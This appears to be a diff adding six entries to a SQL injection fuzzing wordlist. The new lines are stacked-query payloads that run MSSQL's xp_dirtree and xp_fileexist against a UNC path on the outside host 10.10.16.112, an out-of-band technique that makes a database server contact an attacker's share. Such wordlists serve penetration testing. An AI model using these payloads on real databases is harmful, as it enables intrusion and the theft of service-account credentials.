@@ -35,6 +35,12 @@
 \\
 `
 ``
+;exec xp_dirtree '\\10.10.16.112\test\port_forwarding' --
+1;exec xp_dirtree '\\10.10.16.112\test\port_forwarding' --
+a'; exec xp_dirtree '\\10.10.16.112\test\port_forwarding' --
+;exec xp_fileexist '\\10.10.16.112\test\port_forwarding' --
+1;exec xp_fileexist '\\10.10.16.112\test\port_forwarding' --
+a'; exec xp_fileexist '\\10.10.16.112\test\port_forwarding' --
 '=0--+
 %00
 ;%00	Nullbyte
